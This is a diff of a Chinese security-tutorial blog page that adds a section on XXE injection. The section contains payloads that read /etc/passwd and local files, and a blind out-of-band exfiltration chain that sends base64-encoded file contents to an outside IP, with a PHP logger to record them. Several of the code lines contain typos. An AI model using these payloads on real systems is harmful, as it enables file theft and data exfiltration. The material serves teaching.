@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        15.6k
+                        16.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        57 分
+                        61 分
                     </div>
                     
                 
@@ -1514,6 +1514,126 @@ select 1,null,to_char(UPASS) from (select rownum r,UPASS from admin) where r=1</
 <li>支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题；</li>
 <li>金额查过阈值，进行人工审核。</li>
 </ul>
+<h2 id="XXE——实体注入"><a href="#XXE——实体注入" class="headerlink" title="XXE——实体注入"></a>XXE——实体注入</h2><p>XML外部实体注入</p>
+<p>XXE：用户输入的数据被当做XML代码执行</p>
+<h3 id="什么是-XML？"><a href="#什么是-XML？" class="headerlink" title="什么是 XML？"></a>什么是 XML？</h3><p>XML指扩扩展标记语言（EXtensible Markup Language）；</p>
+<p>XML是一种标记语言，很类似HTML；</p>
+<p>XML的设计宗旨是传输数据，而非显示数据；</p>
+<p>XML标签没有被预定义，您需要自行定义标签；</p>
+<p>XML被设计为具有自我描述性；</p>
+<p>XML是W3C的推荐标准。</p>
+<br>
+
+<p>特点：</p>
+<p>XML:仅仅是纯文本，他不会做任何事情；</p>
+<p>XML可以自己发明标签（允许定义自己的标签和文档结构）</p>
+<br>
+
+<p>XML无所不在。XML是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行。</p>
+<br>
+
+<p>总的来说，这玩意儿就是个存储数据的。</p>
+<p>他是怎么存储数据的呢？</p>
+<p>存一份模板，再存一堆东西，模板怎么来</p>
+<p>就是去要去家在某个文件，这个部分就是DTD</p>
+<p>这里可以获取访问加载xxxx，那么是不是可以获取本机文件呢！？</p>
+<h3 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h3><p>XXE=XML External Entity即外部实体，从安全角度理解成XML External Entity attack XML外部实体注入攻击。</p>
+<p>典型的攻击如下：</p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo[
+    &lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY xxe SYSTEM "file://etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>第行是XML声明；</p>
+<p>第2,3,4行是DTD部分；</p>
+<p>最后一行是XML部分</p>
+<p>定义实体必须写在DTD部分</p>
+<h3 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h3><p>php中存在一个叫做simple_load_string的函数</p>
+<p>这个函数是将XML转化为对象</p>
+<p>实例：</p>
+<pre><code>&lt;?php
+$test='&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM "file:///c:/1.txt"&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;';
+$obj=simplexml_load_string($test,'SimpleXMLElement',LIBXML_NOENT);
+print_r($obj);
+?&gt;</code></pre><p>变量test来面是XML</p>
+<p>然后使用simplexm;_load_string将其转化为对象，第一个参数是XML语句，simpleXMlElement是滴啊用了SimpleXMLElement这个类，然后LIBXML_NOENT是替代实体，然后他去执行了file协议去读取我的文件</p>
+<p>有了XML实体，关键字‘SYSTEM’会令XMl解析器从URL中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是亚UN成系统上的文件）</p>
+<h3 id="XXE——扩展"><a href="#XXE——扩展" class="headerlink" title="XXE——扩展"></a>XXE——扩展</h3><pre><code>&lt;!ENTITY 实体名称 SYSTEM “URI/URL"&gt;</code></pre><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下：</p>
+<table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher *</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>XXE中也存在不给你显示的情况（类似于盲注）</p>
+<p>1、利用其他东西证明其存在</p>
+<p>2、将想要的数据外带出来</p>
+<p>如：DNS注入、反弹注入</p>
+<p>我们先读取我们想要的文件，然后为了传输方便，我们先来个base64编码，我们可以使用php伪协议读取文件（仅PHP支持）</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=c:/1.txt</code></pre><p>然后我们再去调用一个外部xml，比如1.xml</p>
+<pre><code>&lt;!ENTITY % remote SYSTEM "http://192.168.192.131/1.xml"&gt;</code></pre><pre><code>&lt;!ENTITY % all
+"&lt;!ENTITY &amp;#25;send SYSTEM 'http://120.203.13.75:8123/xxe/2.php?id=%file;'&gt;"
+&gt;
+%all;</code></pre><p>这个1.xml会被加载到原本的Xml，然后我们最后来调用，然后你读取出来的文件会用get传承那的方式传参给2.php然后2.php记录下来存储到3.txt中</p>
+<pre><code>&lt;?php fiel_put_contents("3.txt",$_GET["id"],FILE_APPEND;?&gt;</code></pre><p>我们可以通过获取别人访问我这个文件传的参数，然后将这个参数存储下来，来做到获取别人数据的方法，</p>
+<p>所以我们需要一个炮台（公网ip）</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2240,7 +2360,7 @@ address 192.168.0.
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">19.4k</span> 字
+                <span class="white-color">20.4k</span> 字
             
 
             
